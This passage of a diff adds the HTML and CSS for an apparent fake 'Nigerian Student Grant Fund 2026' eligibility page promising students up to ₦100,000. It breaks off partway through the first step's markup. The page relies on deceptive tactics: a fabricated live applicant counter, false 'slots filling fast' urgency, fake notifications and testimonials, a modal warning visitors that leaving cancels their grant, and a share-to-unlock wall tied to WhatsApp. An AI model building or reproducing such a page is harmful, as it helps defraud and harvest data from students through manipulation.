@@ -1,0 +1,896 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Nigerian Student Grant Fund 2026 — Check Your Eligibility</title>
+<meta name="robots" content="noindex,nofollow">
+<link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700;800;900&family=DM+Sans:wght@400;500;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#F7F3EC;--bg2:#EDE8DF;--bg3:#E4DDD2;
+  --card:#FFFFFF;--card2:#F9F6F1;
+  --ink:#1C1A14;--ink2:#2E2A20;
+  --muted:#7A7060;--line:#DDD8CE;
+  --green:#0A5C2E;--green2:#0D7A3E;--green3:#10924A;
+  --mint:#E8F4ED;--mint2:#D4EBE0;
+  --gold:#8B6200;--gold2:#B8820A;--gold3:#D4A010;
+  --red:#8B1A1A;--red2:#C0392B;
+  --wa:#25D366;--tg:#2AABEE;
+  --ng:#008751;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:"DM Sans",sans-serif;background:var(--bg);color:var(--ink);min-height:100vh;overflow-x:hidden;-webkit-user-select:none;user-select:none;}
+
+@keyframes rise{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
+@keyframes pop{from{transform:scale(.3);opacity:0}to{transform:scale(1);opacity:1}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
+@keyframes shine{0%,100%{left:-60%}50%{left:130%}}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(10,92,46,.35)}70%{box-shadow:0 0 0 14px transparent}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes tickS{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+@keyframes slideIn{from{transform:translateX(-12px);opacity:0}to{transform:translateX(0);opacity:1}}
+@keyframes checkBounce{0%{transform:scale(0)}60%{transform:scale(1.2)}100%{transform:scale(1)}}
+@keyframes stickyPulse{0%,100%{box-shadow:0 -4px 20px rgba(10,92,46,.2),0 0 0 0 rgba(10,92,46,.3)}70%{box-shadow:0 -4px 20px rgba(10,92,46,.2),0 0 0 10px transparent}}
+@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+@keyframes barLoad{from{width:0%}to{width:100%}}
+
+/* NOTIFICATIONS */
+.nz{position:fixed;top:0;left:0;right:0;z-index:9990;pointer-events:none;display:flex;flex-direction:column;align-items:center;}
+.notif{width:100%;max-width:480px;background:var(--card);border-bottom:3px solid var(--ng);border-left:4px solid var(--gold2);padding:11px 16px;display:flex;align-items:flex-start;gap:10px;box-shadow:0 4px 20px rgba(0,0,0,.12);transform:translateY(-110%);opacity:0;transition:transform .5s cubic-bezier(.34,1.56,.64,1),opacity .4s ease;}
+.notif.show{transform:translateY(0);opacity:1;}
+.notif.hide{transform:translateY(-115%);opacity:0;transition:transform .3s ease,opacity .3s ease;}
+.n-av{width:30px;height:30px;border-radius:50%;background:var(--mint);display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0;}
+.n-b{flex:1;}
+.n-badge{font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--ng);font-family:"DM Mono",monospace;}
+.n-row{display:flex;align-items:center;justify-content:space-between;}
+.n-name{font-size:12px;font-weight:700;color:var(--ink);}
+.n-time{font-size:10px;color:var(--muted);font-family:"DM Mono",monospace;}
+.n-msg{font-size:12px;color:var(--muted);line-height:1.5;}
+.n-msg .ok{color:var(--green);font-weight:700;}
+.n-msg .hl{color:var(--gold2);font-weight:700;}
+
+/* STICKY CTA */
+.sticky-cta{position:fixed;bottom:0;left:0;right:0;z-index:9980;max-width:480px;margin:0 auto;padding:10px 14px 16px;background:linear-gradient(to top,var(--bg) 70%,rgba(247,243,236,0));pointer-events:none;}
+.sticky-btn{width:100%;padding:17px;border:none;border-radius:12px;font-family:"Playfair Display",serif;font-size:20px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;animation:stickyPulse 2.5s ease-in-out infinite;position:relative;overflow:hidden;pointer-events:all;background:var(--green);color:#fff;box-shadow:0 4px 20px rgba(10,92,46,.3);}
+.sticky-btn::after{content:"";position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.15);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
+.sticky-btn:active{transform:scale(.98);}
+.bounce-arrow{position:fixed;bottom:78px;left:50%;transform:translateX(-50%);z-index:9979;font-size:22px;animation:bounce 1s ease-in-out infinite;pointer-events:none;}
+.bounce-arrow.gone{display:none;}
+
+/* FLAG */
+.flag{display:flex;height:5px;}
+.f1,.f3{flex:1;background:var(--ng);}
+.f2{flex:1;background:#fff;}
+
+/* HEADER */
+.hdr{background:var(--card);border-bottom:1.5px solid var(--line);padding:12px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;backdrop-filter:blur(10px);}
+.hdr-brand{display:flex;align-items:center;gap:8px;}
+.hdr-seal{width:32px;height:32px;border-radius:8px;background:linear-gradient(135deg,var(--green),var(--green2));display:flex;align-items:center;justify-content:center;font-size:16px;}
+.hdr-name{font-family:"Playfair Display",serif;font-size:14px;font-weight:800;color:var(--ink);}
+.hdr-live{display:flex;align-items:center;gap:5px;}
+.hdr-dot{width:6px;height:6px;border-radius:50%;background:var(--green3);animation:blink 1s infinite;box-shadow:0 0 5px var(--green3);}
+.hdr-count{font-size:12px;font-weight:700;color:var(--green);font-family:"DM Mono",monospace;}
+
+/* TICKER */
+.ticker{background:var(--green);overflow:hidden;padding:7px 0;}
+.ti{display:flex;white-space:nowrap;animation:tickS 22s linear infinite;}
+.ti span{font-size:10px;font-weight:700;letter-spacing:2px;text-transform:uppercase;color:rgba(255,255,255,.85);padding:0 22px;flex-shrink:0;font-family:"DM Mono",monospace;}
+.ti span::after{content:"🎓";margin-left:18px;}
+
+/* STEP BAR */
+.step-bar{background:var(--bg2);border-bottom:1px solid var(--line);padding:10px 16px;display:flex;align-items:center;justify-content:center;gap:0;}
+.sc{width:26px;height:26px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;font-family:"DM Mono",monospace;flex-shrink:0;transition:all .3s;}
+.sc.active{background:var(--green);color:#fff;box-shadow:0 0 10px rgba(10,92,46,.3);}
+.sc.done{background:var(--green3);color:#fff;}
+.sc.pending{background:var(--bg3);border:1.5px solid var(--line);color:var(--muted);}
+.sl{height:2px;width:30px;background:var(--line);flex-shrink:0;}
+.sl.done{background:var(--green3);}
+
+.page{max-width:480px;margin:0 auto;padding:0 14px 100px;position:relative;z-index:1;}
+
+/* ══ STEP 1 — LANDING ══ */
+#s1{display:block;}
+
+/* HERO */
+.hero{padding:24px 0 20px;animation:rise .5s ease both;}
+.hero-pill{display:inline-flex;align-items:center;gap:7px;background:var(--mint);border:1px solid rgba(10,92,46,.2);border-radius:4px;padding:5px 12px;margin-bottom:14px;}
+.hp-dot{width:6px;height:6px;border-radius:50%;background:var(--green2);animation:blink 1s infinite;}
+.hp-txt{font-size:10px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--green);font-family:"DM Mono",monospace;}
+.hero h1{font-family:"Playfair Display",serif;font-size:clamp(28px,8vw,38px);font-weight:900;line-height:1.15;color:var(--ink);margin-bottom:12px;}
+.hero h1 em{color:var(--green);font-style:normal;}
+.hero h1 span{color:var(--gold2);}
+.hero-p{font-size:14px;color:var(--muted);line-height:1.8;margin-bottom:20px;}
+.hero-p strong{color:var(--ink);font-weight:700;}
+
+/* CHECKER CARD — main action above fold */
+.checker-card{background:var(--card);border:1.5px solid var(--line);border-radius:14px;overflow:hidden;margin-bottom:20px;animation:rise .5s .04s ease both;box-shadow:0 4px 20px rgba(0,0,0,.06);}
+.cc-hd{background:linear-gradient(135deg,var(--green),var(--green2));padding:14px 16px;display:flex;align-items:center;justify-content:space-between;}
+.cc-hd-left{display:flex;align-items:center;gap:10px;}
+.cc-hd-icon{font-size:22px;}
+.cc-hd-title{font-family:"Playfair Display",serif;font-size:16px;font-weight:800;color:#fff;}
+.cc-hd-sub{font-size:11px;color:rgba(255,255,255,.75);}
+.cc-hd-badge{background:rgba(255,255,255,.2);border-radius:100px;padding:4px 10px;font-size:10px;font-weight:700;color:#fff;font-family:"DM Mono",monospace;}
+.cc-body{padding:16px;}
+
+/* STATE SELECTOR */
+.cc-label{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:1px;text-transform:uppercase;font-family:"DM Mono",monospace;margin-bottom:6px;display:block;}
+.cc-select{width:100%;padding:13px 14px;background:var(--bg2);border:1.5px solid var(--line);border-radius:9px;color:var(--ink);font-family:"DM Sans",sans-serif;font-size:14px;font-weight:600;outline:none;appearance:none;-webkit-appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%237A7060' stroke-width='1.5' fill='none'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 14px center;margin-bottom:12px;cursor:pointer;transition:border-color .2s;}
+.cc-select:focus{border-color:var(--green2);}
+.cc-select option{color:var(--ink);}
+
+/* LEVEL PILLS */
+.level-wrap{margin-bottom:14px;}
+.level-pills{display:flex;flex-wrap:wrap;gap:7px;}
+.level-pill{padding:8px 14px;background:var(--bg2);border:1.5px solid var(--line);border-radius:100px;font-size:13px;font-weight:600;color:var(--muted);cursor:pointer;transition:all .2s;}
+.level-pill:hover{border-color:var(--green);color:var(--green);}
+.level-pill.selected{background:var(--mint);border-color:var(--green);color:var(--green);font-weight:700;}
+
+.btn-check{width:100%;padding:16px;background:var(--green);color:#fff;border:none;border-radius:10px;font-family:"Playfair Display",serif;font-size:20px;font-weight:800;cursor:pointer;position:relative;overflow:hidden;box-shadow:0 4px 16px rgba(10,92,46,.3);animation:pulse 2.5s ease-in-out infinite;transition:transform .15s;}
+.btn-check::after{content:"";position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.15);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
+.btn-check:active{transform:scale(.98);}
+
+/* TRUST STRIP */
+.trust-strip{display:flex;align-items:center;justify-content:center;gap:16px;padding:12px 0;margin-bottom:16px;}
+.ts-item{display:flex;align-items:center;gap:5px;font-size:11px;color:var(--muted);font-weight:600;}
+.ts-icon{font-size:14px;}
+
+/* GRANT CARDS */
+.grants-hd{font-family:"Playfair Display",serif;font-size:18px;font-weight:800;color:var(--ink);margin-bottom:4px;}
+.grants-sub{font-size:12px;color:var(--muted);margin-bottom:12px;}
+.grant-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:20px;}
+.grant-card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:13px 12px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden;}
+.grant-card:hover{border-color:var(--green);box-shadow:0 2px 12px rgba(10,92,46,.1);}
+.grant-card.selected{border-color:var(--green);background:var(--mint);}
+.gc-icon{font-size:20px;margin-bottom:6px;display:block;}
+.gc-type{font-size:12px;font-weight:700;color:var(--ink);margin-bottom:3px;}
+.gc-amount{font-size:14px;font-weight:800;color:var(--green);}
+.gc-check{position:absolute;top:8px;right:8px;width:18px;height:18px;border-radius:50%;background:var(--green);display:none;align-items:center;justify-content:center;font-size:10px;color:#fff;}
+.grant-card.selected .gc-check{display:flex;}
+
+/* TESTIMONIALS */
+.testi-hd{display:flex;align-items:center;gap:7px;margin-bottom:10px;}
+.td-dot{width:6px;height:6px;border-radius:50%;background:var(--green3);animation:blink 1.2s infinite;}
+.td-txt{font-size:10px;font-weight:700;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase;font-family:"DM Mono",monospace;}
+.tc{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;display:flex;align-items:flex-start;gap:10px;margin-bottom:8px;animation:slideIn .4s ease both;}
+.tc-av{width:30px;height:30px;border-radius:50%;background:var(--mint);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0;}
+.tc-b{flex:1;}
+.tc-hd{font-size:12px;font-weight:700;color:var(--ink);display:flex;align-items:center;justify-content:space-between;margin-bottom:2px;}
+.tc-time{font-size:10px;color:var(--muted);font-family:"DM Mono",monospace;font-weight:400;}
+.tc-msg{font-size:12px;color:var(--muted);line-height:1.55;}
+.tc-msg .ok{color:var(--green);font-weight:700;}
+.tc-msg .hl{color:var(--gold2);font-weight:700;}
+
+/* ══ STEP 2 — CHECKING ══ */
+#s2{display:none;}
+.checking-wrap{min-height:60vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 0;text-align:center;}
+.ck-spinner{width:70px;height:70px;border-radius:50%;border:4px solid var(--mint2);border-top-color:var(--green);animation:spin 1s linear infinite;margin:0 auto 20px;}
+.ck-title{font-family:"Playfair Display",serif;font-size:22px;font-weight:800;color:var(--ink);margin-bottom:8px;}
+.ck-sub{font-size:13px;color:var(--muted);line-height:1.7;max-width:280px;}
+.ck-sub strong{color:var(--ink);}
+.ck-bar-wrap{width:100%;max-width:280px;margin:16px auto 0;}
+.ck-bar{height:6px;background:var(--bg3);border-radius:100px;overflow:hidden;}
+.ck-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--green3));border-radius:100px;width:0%;transition:width .4s ease;}
+.ck-steps{display:flex;flex-direction:column;gap:6px;margin-top:16px;text-align:left;max-width:280px;}
+.ck-step{font-size:12px;color:var(--muted);display:flex;align-items:center;gap:8px;font-family:"DM Mono",monospace;}
+.ck-step.done{color:var(--green);}
+.ck-step-dot{width:14px;height:14px;border-radius:50%;border:1.5px solid var(--line);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:8px;}
+.ck-step.done .ck-step-dot{background:var(--green);border-color:var(--green);color:#fff;}
+
+/* ══ STEP 3 — RESULT ══ */
+#s3{display:none;}
+.result-wrap{padding:24px 0 20px;text-align:center;animation:rise .5s ease both;}
+.result-badge{display:inline-flex;align-items:center;gap:8px;background:var(--mint);border:1.5px solid rgba(10,92,46,.25);border-radius:100px;padding:7px 18px;margin-bottom:16px;}
+.rb-icon{font-size:18px;}
+.rb-txt{font-size:12px;font-weight:700;color:var(--green);font-family:"DM Mono",monospace;letter-spacing:.5px;}
+.result-wrap h2{font-family:"Playfair Display",serif;font-size:26px;font-weight:900;color:var(--ink);margin-bottom:8px;line-height:1.2;}
+.result-wrap h2 em{color:var(--green);font-style:normal;}
+.result-wrap p{font-size:13px;color:var(--muted);line-height:1.75;max-width:320px;margin:0 auto 20px;}
+.result-wrap p strong{color:var(--ink);}
+
+/* AMOUNT REVEAL */
+.amount-reveal{background:linear-gradient(135deg,var(--mint),var(--mint2));border:1.5px solid rgba(10,92,46,.2);border-radius:14px;padding:20px;margin-bottom:16px;text-align:center;animation:pop .5s cubic-bezier(.34,1.56,.64,1) both;}
+.ar-lbl{font-size:10px;font-weight:700;color:var(--green);letter-spacing:2px;text-transform:uppercase;font-family:"DM Mono",monospace;margin-bottom:8px;}
+.ar-amount{font-family:"Playfair Display",serif;font-size:52px;font-weight:900;color:var(--green);line-height:1;}
+.ar-state{font-size:13px;color:var(--muted);margin-top:6px;}
+.ar-state strong{color:var(--ink);}
+
+/* ELIGIBILITY BREAKDOWN */
+.elig-card{background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin-bottom:16px;}
+.ec-hd{background:var(--bg2);padding:10px 14px;font-size:10px;font-weight:700;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase;font-family:"DM Mono",monospace;border-bottom:1px solid var(--line);}
+.ec-row{display:flex;justify-content:space-between;align-items:center;padding:10px 14px;border-bottom:1px solid var(--line);}
+.ec-row:last-child{border-bottom:none;}
+.ec-key{font-size:12px;color:var(--muted);}
+.ec-val{font-size:12px;font-weight:700;color:var(--ink);}
+.ec-val.green{color:var(--green);}
+.ec-val.gold{color:var(--gold2);}
+
+.btn-proceed{width:100%;padding:16px;background:var(--green);color:#fff;border:none;border-radius:10px;font-family:"Playfair Display",serif;font-size:20px;font-weight:800;cursor:pointer;position:relative;overflow:hidden;margin-bottom:10px;box-shadow:0 4px 16px rgba(10,92,46,.3);}
+.btn-proceed::after{content:"";position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.15);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
+
+/* ══ STEP 4 — FORM ══ */
+#s4{display:none;}
+.form-hd{padding:20px 0 16px;animation:rise .5s ease both;}
+.step-badge{display:inline-flex;align-items:center;gap:6px;background:var(--mint);border:1px solid rgba(10,92,46,.2);border-radius:100px;padding:5px 14px;font-size:11px;font-weight:700;color:var(--green);margin-bottom:12px;font-family:"DM Mono",monospace;}
+.form-hd h2{font-family:"Playfair Display",serif;font-size:22px;font-weight:800;color:var(--ink);margin-bottom:4px;}
+.form-hd p{font-size:13px;color:var(--muted);}
+.form-card{background:var(--card);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin-bottom:14px;}
+.fc-hd{background:var(--bg2);padding:10px 16px;border-bottom:1px solid var(--line);display:flex;align-items:center;justify-content:space-between;}
+.fc-hd-title{font-size:12px;font-weight:700;color:var(--ink);}
+.fc-hd-ref{font-size:10px;color:var(--muted);font-family:"DM Mono",monospace;}
+.fc-body{padding:16px;}
+.fg{margin-bottom:12px;}
+.fg:last-child{margin-bottom:0;}
+.fl{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:.8px;text-transform:uppercase;font-family:"DM Mono",monospace;margin-bottom:5px;display:block;}
+.fi{width:100%;padding:12px 14px;background:var(--bg2);border:1.5px solid var(--line);border-radius:8px;color:var(--ink);font-family:"DM Sans",sans-serif;font-size:14px;font-weight:500;outline:none;transition:border-color .2s;}
+.fi:focus{border-color:var(--green2);}
+.fi::placeholder{color:rgba(122,112,96,.4);}
+.fi-hint{font-size:11px;color:var(--muted);margin-top:4px;}
+.privacy-box{background:var(--mint);border:1px solid rgba(10,92,46,.15);border-radius:8px;padding:10px 13px;margin-bottom:14px;display:flex;align-items:flex-start;gap:8px;font-size:12px;color:var(--green);font-weight:600;line-height:1.6;}
+
+/* ══ STEP 5 — SHARE WALL ══ */
+#s5{display:none;}
+.sw-top{text-align:center;padding:20px 0 16px;animation:rise .5s ease both;}
+.sw-top h2{font-family:"Playfair Display",serif;font-size:22px;font-weight:800;color:var(--ink);margin-bottom:6px;}
+.sw-top p{font-size:13px;color:var(--muted);line-height:1.7;max-width:300px;margin:0 auto;}
+.sw-top p strong{color:var(--ink);}
+
+.share-notice{background:rgba(139,98,0,.06);border:1px solid rgba(184,134,11,.2);border-left:3px solid var(--gold2);border-radius:0 8px 8px 0;padding:11px 14px;margin-bottom:14px;font-size:12px;color:var(--gold);font-weight:600;line-height:1.6;}
+.share-notice strong{color:var(--gold2);font-weight:800;}
+
+/* LOADING BAR — no numbers */
+.load-card{background:var(--card);border:1px solid var(--line);border-radius:12px;padding:16px;margin-bottom:14px;}
+.lc-top{display:flex;align-items:center;justify-content:space-between;margin-bottom:10px;}
+.lc-lbl{font-size:11px;font-weight:700;color:var(--muted);font-family:"DM Mono",monospace;text-transform:uppercase;letter-spacing:1px;}
+.lc-pct{font-family:"Playfair Display",serif;font-size:22px;font-weight:800;color:var(--green);}
+.lc-track{height:14px;background:var(--bg3);border-radius:100px;overflow:hidden;border:1px solid var(--line);margin-bottom:8px;}
+.lc-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--green3));border-radius:100px;width:0%;transition:width .8s cubic-bezier(.34,1.56,.64,1);}
+.lc-status{font-size:11px;color:var(--muted);text-align:center;font-family:"DM Mono",monospace;}
+
+.track-box{background:var(--bg2);border:1px solid var(--line);border-radius:8px;padding:10px 12px;margin-bottom:12px;display:flex;align-items:center;gap:10px;}
+.tb-dot{width:7px;height:7px;border-radius:50%;background:var(--green3);animation:blink .8s infinite;flex-shrink:0;}
+.tb-b{flex:1;}
+.tb-title{font-size:12px;font-weight:700;color:var(--ink);}
+.tb-sub{font-size:11px;color:var(--muted);font-family:"DM Mono",monospace;}
+.tb-code{font-size:11px;font-weight:700;color:var(--gold2);font-family:"DM Mono",monospace;flex-shrink:0;}
+
+.sf-toast{background:var(--mint);border:1px solid rgba(10,92,46,.2);border-radius:7px;padding:8px 12px;font-size:12px;font-weight:700;color:var(--green);font-family:"DM Mono",monospace;display:none;margin-bottom:10px;text-align:center;}
+.sf-toast.show{display:block;}
+
+/* BIG SHARE BUTTON */
+.btn-share-big{width:100%;padding:0;background:none;border:none;cursor:pointer;display:block;margin-bottom:8px;}
+.bsb-inner{background:var(--wa);border-radius:12px;padding:17px 16px;display:flex;align-items:center;gap:12px;position:relative;overflow:hidden;box-shadow:0 6px 24px rgba(37,211,102,.3);transition:transform .15s;}
+.btn-share-big:active .bsb-inner{transform:scale(.98);}
+.bsb-icon{font-size:28px;flex-shrink:0;}
+.bsb-body{text-align:left;flex:1;}
+.bsb-title{font-family:"Playfair Display",serif;font-size:20px;font-weight:800;color:#fff;display:block;line-height:1.1;}
+.bsb-sub{font-size:11px;color:rgba(255,255,255,.8);display:block;margin-top:2px;font-family:"DM Mono",monospace;}
+.bsb-arr{font-size:22px;color:rgba(255,255,255,.6);flex-shrink:0;}
+
+.sw-note{text-align:center;font-size:11px;color:var(--muted);font-family:"DM Mono",monospace;margin-bottom:14px;}
+.ghost{color:var(--bg);font-size:11px;text-align:center;padding:3px 0 12px;}
+
+/* ══ STEP 6 — UNLOCK ══ */
+#s6{display:none;}
+.unlock-wrap{min-height:70vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:30px 0;text-align:center;}
+.unlock-seal{width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--green2));display:flex;align-items:center;justify-content:center;margin:0 auto 16px;animation:pop .6s cubic-bezier(.34,1.56,.64,1) both;box-shadow:0 0 0 10px rgba(10,92,46,.08),0 0 0 20px rgba(10,92,46,.04);font-size:32px;}
+.unlock-wrap h2{font-family:"Playfair Display",serif;font-size:26px;font-weight:900;color:var(--ink);margin-bottom:8px;}
+.unlock-sub{font-size:13px;color:var(--muted);line-height:1.75;margin-bottom:20px;max-width:300px;}
+.unlock-sub strong{color:var(--ink);}
+
+.ref-box{background:var(--mint);border:1.5px solid rgba(10,92,46,.2);border-radius:10px;padding:14px 16px;margin-bottom:16px;width:100%;}
+.rb-lbl{font-size:10px;font-weight:700;color:var(--green);letter-spacing:1.5px;text-transform:uppercase;font-family:"DM Mono",monospace;margin-bottom:5px;}
+.rb-txt{font-size:13px;color:var(--ink);font-weight:600;line-height:1.7;}
+.rb-code{color:var(--green);font-family:"DM Mono",monospace;font-weight:800;}
+
+.cta-stack{display:flex;flex-direction:column;gap:9px;width:100%;margin-bottom:12px;}
+.btn-tg-f{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;padding:16px;background:var(--tg);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:800;cursor:pointer;text-decoration:none;animation:pulse 2.5s ease-in-out infinite;box-shadow:0 4px 16px rgba(42,171,238,.2);}
+.btn-wa-f{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;padding:15px;background:var(--wa);color:#fff;border:none;border-radius:10px;font-size:14px;font-weight:800;cursor:pointer;text-decoration:none;transition:transform .15s;}
+.btn-aff{display:block;width:100%;padding:13px;background:var(--bg2);border:1px solid var(--line);border-radius:10px;color:var(--muted);font-size:13px;font-weight:700;cursor:pointer;text-decoration:none;text-align:center;transition:all .2s;}
+.share-again-row{display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--line);border-radius:9px;padding:11px 14px;margin-bottom:10px;}
+.sar-b{flex:1;}
+.sar-t{font-size:13px;font-weight:700;color:var(--ink);}
+.sar-s{font-size:11px;color:var(--muted);}
+.btn-sar{padding:8px 13px;background:var(--wa);color:#fff;border:none;border-radius:7px;font-size:12px;font-weight:700;cursor:pointer;flex-shrink:0;}
+.un-note{font-size:11px;color:var(--muted);font-family:"DM Mono",monospace;}
+
+/* BACK WARNING */
+#backWarn{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:99998;display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(12px);}
+#backWarn.show{display:flex;}
+.bw-card{width:100%;max-width:400px;background:var(--card);border:2px solid var(--red2);border-radius:16px;padding:24px 20px;text-align:center;}
+.bw-icon{font-size:46px;display:block;margin-bottom:12px;}
+.bw-title{font-family:"Playfair Display",serif;font-size:22px;font-weight:800;color:var(--red2);margin-bottom:10px;}
+.bw-body{font-size:13px;color:var(--muted);line-height:1.75;margin-bottom:18px;}
+.bw-body strong{color:var(--ink);}
+.btn-bw-stay{width:100%;padding:14px;background:var(--green);color:#fff;border:none;border-radius:10px;font-family:"Playfair Display",serif;font-size:18px;font-weight:800;cursor:pointer;margin-bottom:8px;}
+.btn-bw-leave{width:100%;padding:11px;background:transparent;border:1px solid var(--line);border-radius:9px;color:var(--muted);font-size:12px;font-weight:600;cursor:pointer;}
+
+.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--ink);color:#fff;padding:10px 20px;border-radius:100px;font-size:12px;font-weight:600;transition:transform .45s cubic-bezier(.34,1.56,.64,1);z-index:9999;white-space:nowrap;font-family:"DM Mono",monospace;}
+.toast.show{transform:translateX(-50%) translateY(0);}
+</style>
+</head>
+<body>
+
+<!-- BACK WARNING -->
+<div id="backWarn">
+  <div class="bw-card">
+    <span class="bw-icon">⚠️</span>
+    <div class="bw-title">Your Application Will Be Lost!</div>
+    <div class="bw-body">If you go back now, your <strong>grant application will be cancelled</strong>. Complete the process to receive your funds.</div>
+    <button class="btn-bw-stay" onclick="closeBackWarn()">✅ Continue My Application</button>
+    <button class="btn-bw-leave" onclick="closeBackWarn()">I understand I will lose my slot</button>
+  </div>
+</div>
+
+<!-- NOTIFICATIONS -->
+<div class="nz" id="nz"></div>
+
+<!-- STICKY CTA -->
+<div class="sticky-cta" id="stickyCta">
+  <button class="sticky-btn" id="stickyBtn" onclick="handleSticky()">
+    <span id="stickyIcon">🎓</span>
+    <span id="stickyText">Check My Eligibility Now</span>
+  </button>
+</div>
+<div class="bounce-arrow" id="bounceArrow">⬇️</div>
+
+<!-- FLAG -->
+<div class="flag"><div class="f1"></div><div class="f2"></div><div class="f3"></div></div>
+
+<!-- HEADER -->
+<div class="hdr">
+  <div class="hdr-brand">
+    <div class="hdr-seal">🎓</div>
+    <div class="hdr-name">Student Grant Fund 2026</div>
+  </div>
+  <div class="hdr-live"><div class="hdr-dot"></div><div class="hdr-count" id="liveNum">54,291</div></div>
+</div>
+
+<!-- TICKER -->
+<div class="ticker">
+  <div class="ti">
+    <span>STUDENT GRANT FUND 2026 — CHECK IF YOU QUALIFY NOW</span>
+    <span>FREE · NO PAYMENT · SCHOOL FEES · UPKEEP · HEALTH CARE</span>
+    <span>54,000+ STUDENTS APPLIED TODAY — SLOTS FILLING FAST</span>
+    <span>STUDENT GRANT FUND 2026 — CHECK IF YOU QUALIFY NOW</span>
+    <span>FREE · NO PAYMENT · SCHOOL FEES · UPKEEP · HEALTH CARE</span>
+    <span>54,000+ STUDENTS APPLIED TODAY — SLOTS FILLING FAST</span>
+  </div>
+</div>
+
+<!-- STEP BAR -->
+<div class="step-bar">
+  <div class="sc active" id="sc1">1</div><div class="sl" id="sl1"></div>
+  <div class="sc pending" id="sc2">2</div><div class="sl" id="sl2"></div>
+  <div class="sc pending" id="sc3">3</div><div class="sl" id="sl3"></div>
+  <div class="sc pending" id="sc4">4</div><div class="sl" id="sl4"></div>
+  <div class="sc pending" id="sc5">✓</div>
+</div>
+
+<div class="page">
+
+<!-- ══ STEP 1 ══ -->
+<div id="s1">
+  <div class="hero">
+    <div class="hero-pill"><div class="hp-dot"></div><span class="hp-txt">2026 Applications Open</span></div>
+    <h1>Do You Qualify for the <em>Nigerian Student</em> <span>Grant Fund?</span></h1>
+    <p class="hero-p"><strong>Select your state and level below</strong> to instantly check if you qualify for up to ₦100,000 in free grant money.</p>
+  </div>
+
+  <!-- CHECKER CARD -->
+  <div class="checker-card">
+    <div class="cc-hd">
+      <div class="cc-hd-left">
+        <div class="cc-hd-icon">🔍</div>
+        <div>
+          <div class="cc-hd-title">Eligibility Checker</div>
+          <div class="cc-hd-sub">Takes 30 seconds — completely free</div>
+        </div>
+      </div>
+      <div class="cc-hd-badge">FREE</div>
+    </div>
+    <div class="cc-body">
+      <label class="cc-label">Your State</label>
+      <select class="cc-select" id="stateSelect">
+        <option value="">Select your state...</option>
+        <option>Abia</option><option>Adamawa</option><option>Akwa Ibom</option><option>Anambra</option><option>Bauchi</option><option>Bayelsa</option><option>Benue</option><option>Borno</option><option>Cross River</option><option>Delta</option><option>Ebonyi</option><option>Edo</option><option>Ekiti</option><option>Enugu</option><option>FCT Abuja</option><option>Gombe</option><option>Imo</option><option>Jigawa</option><option>Kaduna</option><option>Kano</option><option>Katsina</option><option>Kebbi</option><option>Kogi</option><option>Kwara</option><option>Lagos</option><option>Nasarawa</option><option>Niger</option><option>Ogun</option><option>Ondo</option><option>Osun</option><option>Oyo</option><option>Plateau</option><option>Rivers</option><option>Sokoto</option><option>Taraba</option><option>Yobe</option><option>Zamfara</option>
+      </select>
+      <label class="cc-label">Your Level / Class</label>
+      <div class="level-wrap">
+        <div class="level-pills">
+          <div class="level-pill" onclick="selectLevel(this,'SS2')">SS2</div>
+          <div class="level-pill" onclick="selectLevel(this,'SS3')">SS3</div>
+          <div class="level-pill" onclick="selectLevel(this,'JAMB')">JAMB</div>
+          <div class="level-pill" onclick="selectLevel(this,'100L')">100L</div>
